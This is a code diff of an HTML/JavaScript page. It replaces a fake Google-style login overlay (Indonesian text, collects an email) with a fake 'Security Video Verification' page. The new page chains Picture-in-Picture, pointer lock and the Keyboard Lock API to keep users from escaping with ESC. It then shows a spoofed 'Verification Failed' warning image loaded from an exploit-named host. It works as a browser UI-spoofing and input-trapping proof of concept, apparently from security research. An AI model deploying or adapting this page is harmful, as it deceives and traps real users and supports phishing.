@@ -1,329 +1,470 @@
 <!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pointer Lock dengan Tombol L untuk Login (Tanpa Fullscreen)</title>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Security Video Verification - PiP Mode</title>
     <style>
-        body {
-            margin: 0;
-            height: 100vh;
-            background-color: #f0f0f0;
-            font-family: Arial, sans-serif;
-            overflow: hidden;
-            user-select: none;
-            cursor: none;
-        }
-        #instructions {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(0, 0, 0, 0.7);
-            color: white;
-            padding: 20px 40px;
-            border-radius: 10px;
-            text-align: center;
-            cursor: pointer;
-            transition: opacity 0.5s;
-            z-index: 100;
-        }
-        #instructions h2 {
-            margin-bottom: 15px;
-        }
-        #instructions p {
-            margin: 5px 0;
-        }
-        .highlight {
-            color: #4285f4;
-            font-weight: bold;
-        }
-        #movement {
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            background: rgba(0, 0, 0, 0.6);
-            color: white;
-            padding: 10px;
-            border-radius: 5px;
-            display: none;
-        }
-        #escStatus {
-            position: absolute;
-            top: 60px;
-            left: 20px;
-            background: rgba(0, 0, 0, 0.6);
-            color: white;
-            padding: 10px;
-            border-radius: 5px;
-            display: none;
-        }
-        #fakeCursor {
-            position: absolute;
-            width: 10px;
-            height: 10px;
-            background-color: white;
-            border-radius: 50%;
-            pointer-events: none;
-            display: none;
-            z-index: 9999;
-        }
-        #loginOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background-color: rgba(0, 0, 0, 0.9);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-        #loginBox {
-            background-color: #202124;
-            border-radius: 8px;
-            padding: 24px 32px;
-            width: 400px;
-            color: white;
-            text-align: center;
-        }
-        #loginBox .logo {
-            font-size: 48px;
-            color: #4285f4;
-            margin-bottom: 16px;
-        }
-        #loginBox h1 {
-            font-size: 24px;
-            margin: 0 0 8px;
-        }
-        #loginBox p {
-            font-size: 16px;
-            margin: 0 0 24px;
-        }
-        #loginBox input {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 16px;
-            background-color: #303134;
-            border: 1px solid #5f6368;
-            border-radius: 4px;
-            color: white;
-            font-size: 16px;
-        }
-        #loginBox a {
-            color: #8ab4f8;
-            text-decoration: none;
-            font-size: 14px;
-            display: block;
-            margin-bottom: 24px;
-        }
-        #loginBox .buttons {
-            display: flex;
-            justify-content: space-between;
-        }
-        #loginBox .buttons button {
-            padding: 10px 24px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 14px;
-        }
-        #loginBox .buttons .create {
-            background: transparent;
-            color: #8ab4f8;
-        }
-        #loginBox .buttons .next {
-            background: #1a73e8;
-            color: white;
-        }
-        #footer {
-            position: absolute;
-            bottom: 16px;
-            width: 100%;
-            text-align: center;
-            color: #9aa0a6;
-            font-size: 12px;
-        }
-        #footer a {
-            color: #9aa0a6;
-            text-decoration: none;
-            margin: 0 8px;
-        }
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      body {
+        overflow: hidden;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+      #container {
+        position: relative;
+        width: 100vw;
+        height: 100vh;
+      }
+      #verification-panel {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: white;
+        padding: 40px;
+        border-radius: 20px;
+        box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        text-align: center;
+        z-index: 1001;
+        max-width: 500px;
+        transition: opacity 0.3s;
+      }
+      #verification-panel.hidden {
+        display: none;
+      }
+      #verification-panel h2 {
+        color: #667eea;
+        margin-bottom: 20px;
+        font-size: 28px;
+      }
+      #verification-panel p {
+        color: #555;
+        margin-bottom: 15px;
+        line-height: 1.6;
+      }
+      #start-btn {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: white;
+        border: none;
+        padding: 15px 40px;
+        border-radius: 50px;
+        font-size: 18px;
+        cursor: pointer;
+        transition: transform 0.2s;
+        margin-top: 20px;
+      }
+      #start-btn:hover {
+        transform: scale(1.05);
+      }
+      video {
+        display: block;
+        width: 640px;
+        height: 480px;
+        background-color: #000;
+        border-radius: 10px;
+      }
+      canvas {
+        display: none;
+        width: 100vw;
+        height: 100vh;
+        cursor: none;
+        background: radial-gradient(circle, #1a1a2e 0%, #0f0f1e 100%);
+      }
+      canvas.active {
+        display: block;
+      }
+      #ui-overlay {
+        position: fixed;
+        top: 20px;
+        left: 20px;
+        background: rgba(0,0,0,0.8);
+        color: white;
+        padding: 20px;
+        border-radius: 10px;
+        z-index: 999;
+        pointer-events: none;
+        transition: opacity 0.3s;
+        backdrop-filter: blur(10px);
+      }
+      #ui-overlay.hidden {
+        opacity: 0;
+      }
+      #status {
+        font-size: 16px;
+        margin-bottom: 8px;
+      }
+      #pip-status, #pointer-status, #esc-status {
+        font-size: 14px;
+        margin-bottom: 5px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+      .status-indicator {
+        width: 10px;
+        height: 10px;
+        border-radius: 50%;
+        background: #ff4444;
+      }
+      .status-indicator.active {
+        background: #44ff44;
+        box-shadow: 0 0 10px #44ff44;
+      }
+      #spoof-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        background: rgba(0,0,0,0.95);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 2000;
+      }
+      #spoof-content {
+        background: white;
+        padding: 40px;
+        border-radius: 15px;
+        text-align: center;
+        max-width: 600px;
+      }
+      #spoof-content h2 {
+        color: #d32f2f;
+        margin-bottom: 20px;
+      }
+      #spoof-content img {
+        max-width: 100%;
+        border-radius: 10px;
+        margin-top: 20px;
+      }
+      .security-badge {
+        display: inline-block;
+        background: #4caf50;
+        color: white;
+        padding: 5px 15px;
+        border-radius: 20px;
+        font-size: 12px;
+        margin-bottom: 15px;
+      }
     </style>
-</head>
-<body>
-    <div id="instructions">
-        <h2>Klik di mana saja untuk mengaktifkan Pointer Lock</h2>
-        <p>Tekan <span class="highlight">L</span> untuk membuka Login UI</p>
-        <p><small>(Tombol ESC tidak bisa dicegah tanpa Fullscreen mode)</small></p>
-    </div>
-    <div id="movement">Pergerakan mouse: X: 0 | Y: 0</div>
-    <div id="escStatus">Mode: Aktif | Tekan L untuk Login</div>
-    <div id="fakeCursor"></div>
-    <div id="loginOverlay">
-        <div id="loginBox">
-            <div class="logo">G</div>
-            <h1>Login</h1>
-            <p>Gunakan Akun Google Anda</p>
-            <input type="text" id="emailInput" placeholder="Email atau nomor telepon">
-            <a href="#">Lupa email?</a>
-            <p style="font-size: 12px; text-align: left; margin-bottom: 24px;">Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi. <a href="#">Pelajari lebih lanjut cara menggunakan Mode Tamu</a></p>
-            <div class="buttons">
-                <button class="create">Buat akun</button>
-                <button class="next" onclick="handleNext()">Selanjutnya</button>
-            </div>
+  </head>
+  <body>
+    <div id="container">
+      <!-- Initial Verification Panel -->
+      <div id="verification-panel">
+        <div class="security-badge">🔒 Secure Verification</div>
+        <h2>Enhanced Security Check Required</h2>
+        <p>For your security, we need to verify your identity through our advanced video verification system.</p>
+        <p><strong>What happens next:</strong></p>
+        <ul style="text-align: left; margin: 20px 40px;">
+          <li>Picture-in-Picture mode will activate</li>
+          <li>Follow the on-screen instructions</li>
+          <li>Press ESC anytime to cancel</li>
+        </ul>
+        <button id="start-btn">Start Verification</button>
+      </div>
+
+      <!-- Hidden video element for PiP -->
+      <video id="pip-video" autoplay muted></video>
+
+      <!-- Interactive Canvas (appears after PiP) -->
+      <canvas id="canvas"></canvas>
+
+      <!-- Status Overlay -->
+      <div id="ui-overlay" class="hidden">
+        <div id="status"><strong>Verification Active</strong></div>
+        <div id="pip-status">
+          <span class="status-indicator"></span>
+          PiP Mode: Inactive
         </div>
-        <div id="footer">
-            Indonesia <span>▼</span> <a href="#">Bantuan</a> <a href="#">Privasi</a> <a href="#">Persyaratan</a>
+        <div id="pointer-status">
+          <span class="status-indicator"></span>
+          Pointer Lock: Inactive
         </div>
+        <div id="esc-status">
+          <span class="status-indicator"></span>
+          ESC Key: Not Locked
+        </div>
+      </div>
+
+      <!-- Spoof Overlay (shows when ESC pressed) -->
+      <div id="spoof-overlay">
+        <div id="spoof-content">
+          <h2>⚠️ Verification Failed</h2>
+          <p>Your session has been flagged for suspicious activity.</p>
+          <img src="https://0x1337-exploit.github.io/hosting/staging/spoof.png" alt="Fake Warning" />
+        </div>
+      </div>
     </div>
 
     <script>
-        const instructions = document.getElementById('instructions');
-        const movementDisplay = document.getElementById('movement');
-        const escStatus = document.getElementById('escStatus');
-        const fakeCursor = document.getElementById('fakeCursor');
-        const loginOverlay = document.getElementById('loginOverlay');
-        const emailInput = document.getElementById('emailInput');
-        let movementX = 0;
-        let movementY = 0;
-        let loginUIShown = false;
+      const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
+      const pipVideo = document.getElementById("pip-video");
+      const verificationPanel = document.getElementById("verification-panel");
+      const startBtn = document.getElementById("start-btn");
+      const uiOverlay = document.getElementById("ui-overlay");
+      const spoofOverlay = document.getElementById("spoof-overlay");
+      
+      const pipStatusDiv = document.getElementById("pip-status");
+      const pointerStatusDiv = document.getElementById("pointer-status");
+      const escStatusDiv = document.getElementById("esc-status");
+      
+      let isPiPActive = false;
+      let isPointerLocked = false;
+      let isEscLocked = false;
+      let x, y;
+      let escPressCount = 0;
+      let lastEscPress = 0;
 
-        // Fungsi saat pointer lock berhasil diaktifkan
-        function lockChange() {
-            if (document.pointerLockElement === document.body) {
-                instructions.style.opacity = '0';
-                setTimeout(() => { instructions.style.display = 'none'; }, 500);
-                movementDisplay.style.display = 'block';
-                escStatus.style.display = 'block';
-                document.addEventListener('mousemove', onMouseMove);
-                console.log("✓ Pointer locked");
-            } else {
-                if (!loginUIShown) {
-                    instructions.style.display = 'block';
-                    instructions.style.opacity = '1';
-                    movementDisplay.style.display = 'none';
-                    escStatus.style.display = 'none';
-                }
-                document.removeEventListener('mousemove', onMouseMove);
-                console.log("✗ Pointer unlocked");
-            }
+      // Setup canvas
+      function resizeCanvas() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        x = canvas.width / 2;
+        y = canvas.height / 2;
+        draw();
+      }
+      resizeCanvas();
+      window.addEventListener("resize", resizeCanvas);
+
+      // Start Verification Process
+      startBtn.addEventListener("click", async () => {
+        try {
+          verificationPanel.classList.add("hidden");
+          uiOverlay.classList.remove("hidden");
+          
+          // Step 1: Activate Picture-in-Picture
+          await activatePiP();
+          
+          // Step 2: Lock Pointer after small delay
+          setTimeout(async () => {
+            await lockPointer();
+          }, 1000);
+          
+        } catch (err) {
+          console.error("Verification failed:", err);
+          alert("Failed to start verification. Please try again.");
         }
+      });
 
-        // Update nilai pergerakan mouse dan posisi cursor palsu
-        function onMouseMove(e) {
-            movementX += e.movementX || 0;
-            movementY += e.movementY || 0;
-            updateMovementDisplay();
-
-            if (fakeCursor.style.display === 'block') {
-                const cursorX = parseInt(fakeCursor.style.left || window.innerWidth / 2) + (e.movementX || 0);
-                const cursorY = parseInt(fakeCursor.style.top || window.innerHeight / 2) + (e.movementY || 0);
-                fakeCursor.style.left = `${Math.max(0, Math.min(window.innerWidth, cursorX))}px`;
-                fakeCursor.style.top = `${Math.max(0, Math.min(window.innerHeight, cursorY))}px`;
-            }
-        }
-
-        function updateMovementDisplay() {
-            movementDisplay.textContent = `Pergerakan mouse: X: ${movementX} | Y: ${movementY}`;
-        }
-
-        // Deteksi tekan tombol
-        document.addEventListener('keydown', (e) => {
-            // Tombol L untuk login
-            if ((e.key === 'l' || e.key === 'L') && document.pointerLockElement === document.body && !loginUIShown) {
-                showLoginUI();
-            }
-            // ESC untuk tutup login UI
-            else if (e.key === 'Escape' && loginUIShown) {
-                hideLoginUI();
-            }
-        });
-
-        // Tampilkan login UI
-        function showLoginUI() {
-            loginUIShown = true;
+      // Activate Picture-in-Picture Mode
+      async function activatePiP() {
+        try {
+          // Create a fake video stream or use canvas stream
+          const stream = canvas.captureStream(30);
+          pipVideo.srcObject = stream;
+          
+          await pipVideo.play();
+          
+          // Request PiP
+          if (document.pictureInPictureEnabled) {
+            await pipVideo.requestPictureInPicture();
+            isPiPActive = true;
+            updateStatus("pip", true);
+            console.log("PiP activated");
             
-            if (document.pointerLockElement) {
-                document.exitPointerLock();
-            }
-            
-            fakeCursor.style.display = 'block';
-            fakeCursor.style.left = `${window.innerWidth / 2}px`;
-            fakeCursor.style.top = `${window.innerHeight / 2}px`;
-            loginOverlay.style.display = 'flex';
-            document.body.style.backgroundColor = '#202124';
-            document.body.style.cursor = 'default';
-            
-            movementDisplay.style.display = 'none';
-            escStatus.style.display = 'none';
+            // Lock ESC immediately after PiP
+            await lockEsc();
+          }
+        } catch (err) {
+          console.error("PiP failed:", err);
         }
+      }
 
-        // Sembunyikan login UI dan re-lock
-        function hideLoginUI() {
-            loginUIShown = false;
-            fakeCursor.style.display = 'none';
-            loginOverlay.style.display = 'none';
-            document.body.style.backgroundColor = '#f0f0f0';
-            document.body.style.cursor = 'none';
-            
-            movementDisplay.style.display = 'block';
-            escStatus.style.display = 'block';
-            
-            setTimeout(() => {
-                if (!document.pointerLockElement) {
-                    document.body.requestPointerLock();
-                }
-            }, 100);
+      // Lock Pointer
+      async function lockPointer() {
+        try {
+          canvas.classList.add("active");
+          canvas.requestPointerLock();
+        } catch (err) {
+          console.error("Pointer lock failed:", err);
         }
+      }
 
-        // Handle submit
-        function handleNext() {
-            const email = emailInput.value.trim();
-            if (email) {
-                const url = new URL(window.location);
-                url.searchParams.set('email', email);
-                history.pushState({}, '', url);
-                alert(`Email "${email}" telah ditambahkan ke URL.`);
-                hideLoginUI();
-            } else {
-                alert('Masukkan email terlebih dahulu.');
-            }
+      // Lock ESC Key
+      async function lockEsc() {
+        try {
+          if ("keyboard" in navigator) {
+            await navigator.keyboard.lock(["Escape"]);
+            isEscLocked = true;
+            updateStatus("esc", true);
+            console.log("ESC key locked");
+          }
+        } catch (err) {
+          console.error("Keyboard lock failed:", err);
         }
+      }
 
-        // Request pointer lock saat klik
-        document.body.addEventListener('click', () => {
-            if (!loginUIShown && !document.pointerLockElement) {
-                document.body.requestPointerLock();
-            }
-        });
+      // Unlock ESC Key
+      function unlockEsc() {
+        if ("keyboard" in navigator) {
+          navigator.keyboard.unlock();
+          isEscLocked = false;
+          updateStatus("esc", false);
+        }
+      }
 
-        // Event listeners
-        document.addEventListener('pointerlockchange', lockChange);
-        document.addEventListener('mozpointerlockchange', lockChange);
-        document.addEventListener('webkitpointerlockchange', lockChange);
+      // Update Status UI
+      function updateStatus(type, active) {
+        let statusDiv, text;
+        switch(type) {
+          case "pip":
+            statusDiv = pipStatusDiv;
+            text = active ? "PiP Mode: Active ✓" : "PiP Mode: Inactive";
+            break;
+          case "pointer":
+            statusDiv = pointerStatusDiv;
+            text = active ? "Pointer Lock: Active ✓" : "Pointer Lock: Inactive";
+            break;
+          case "esc":
+            statusDiv = escStatusDiv;
+            text = active ? "ESC Key: Locked ✓ (Intercepted)" : "ESC Key: Not Locked";
+            break;
+        }
+        if (statusDiv) {
+          statusDiv.innerHTML = `
+            <span class="status-indicator ${active ? 'active' : ''}"></span>
+            ${text}
+          `;
+        }
+      }
 
-        // Info console
-        console.log(`
-═══════════════════════════════════════════════════════════
-  PENTING: Kenapa tidak pakai ESC?
-───────────────────────────────────────────────────────────
-  • Keyboard Lock API HANYA bekerja di Fullscreen mode
-  • Tanpa fullscreen, browser SELALU keluar dari pointer 
-    lock saat ESC ditekan (keamanan browser)
-  • Ini TIDAK BISA dihindari dengan JavaScript biasa
+      // Handle Pointer Lock Changes
+      document.addEventListener("pointerlockchange", () => {
+        if (document.pointerLockElement === canvas) {
+          isPointerLocked = true;
+          updateStatus("pointer", true);
+          document.addEventListener("mousemove", updatePosition);
+          document.addEventListener("keydown", handleKeyDown);
+          console.log("Pointer locked");
+        } else {
+          isPointerLocked = false;
+          updateStatus("pointer", false);
+          document.removeEventListener("mousemove", updatePosition);
+          document.removeEventListener("keydown", handleKeyDown);
+          
+          // Exit PiP if pointer unlocks
+          if (document.pictureInPictureElement) {
+            document.exitPictureInPicture();
+          }
+          
+          if (isEscLocked) {
+            unlockEsc();
+          }
+          
+          canvas.classList.remove("active");
+          verificationPanel.classList.remove("hidden");
+          uiOverlay.classList.add("hidden");
+          spoofOverlay.style.display = "none";
+        }
+      });
 
-  SOLUSI:
-  ✓ Gunakan tombol L untuk membuka Login UI
-  ✓ Auto re-lock pointer setelah login ditutup
-  
-  KONTROL:
-  • Klik = Aktifkan pointer lock
-  • L = Buka login UI  
-  • ESC = Tutup login UI / Keluar dari pointer lock
-═══════════════════════════════════════════════════════════
-        `);
+      // Handle PiP Changes
+      pipVideo.addEventListener("enterpictureinpicture", () => {
+        console.log("Entered PiP");
+      });
+
+      pipVideo.addEventListener("leavepictureinpicture", () => {
+        isPiPActive = false;
+        updateStatus("pip", false);
+        console.log("Left PiP");
+        
+        // Exit pointer lock if PiP exits
+        if (document.pointerLockElement) {
+          document.exitPointerLock();
+        }
+      });
+
+      // Track mouse movement
+      function updatePosition(e) {
+        x += e.movementX;
+        y += e.movementY;
+        x = Math.max(0, Math.min(canvas.width, x));
+        y = Math.max(0, Math.min(canvas.height, y));
+        draw();
+      }
+
+      // Draw on canvas
+      function draw() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        
+        // Draw grid pattern
+        ctx.strokeStyle = "rgba(102, 126, 234, 0.1)";
+        ctx.lineWidth = 1;
+        for (let i = 0; i < canvas.width; i += 50) {
+          ctx.beginPath();
+          ctx.moveTo(i, 0);
+          ctx.lineTo(i, canvas.height);
+          ctx.stroke();
+        }
+        for (let i = 0; i < canvas.height; i += 50) {
+          ctx.beginPath();
+          ctx.moveTo(0, i);
+          ctx.lineTo(canvas.width, i);
+          ctx.stroke();
+        }
+        
+        // Draw crosshair
+        ctx.strokeStyle = "rgba(255, 255, 255, 0.5)";
+        ctx.lineWidth = 2;
+        ctx.beginPath();
+        ctx.moveTo(x, 0);
+        ctx.lineTo(x, canvas.height);
+        ctx.moveTo(0, y);
+        ctx.lineTo(canvas.width, y);
+        ctx.stroke();
+        
+        // Draw cursor
+        ctx.fillStyle = "#667eea";
+        ctx.shadowBlur = 20;
+        ctx.shadowColor = "#667eea";
+        ctx.beginPath();
+        ctx.arc(x, y, 15, 0, Math.PI * 2);
+        ctx.fill();
+        ctx.shadowBlur = 0;
+      }
+
+      // Handle ESC key press - CRITICAL VULNERABILITY
+      function handleKeyDown(e) {
+        if (e.key === "Escape" && isEscLocked) {
+          const now = Date.now();
+          
+          // Reset counter if more than 1 second between presses
+          if (now - lastEscPress > 1000) {
+            escPressCount = 0;
+          }
+          
+          escPressCount++;
+          lastEscPress = now;
+          
+          console.log(`ESC pressed ${escPressCount}x - Intercepted!`);
+          
+          // Show spoof on 1st or 2nd press (silent interception)
+          if (escPressCount <= 2) {
+            spoofOverlay.style.display = "flex";
+            e.preventDefault();
+          }
+          // On 3rd press, browser might show "hold ESC" dialog
+          // but we still intercept it
+          else if (escPressCount >= 3) {
+            spoofOverlay.style.display = "flex";
+            e.preventDefault();
+          }
+        }
+      }
+
+      draw();
     </script>
-</body>
+  </body>
 </html>
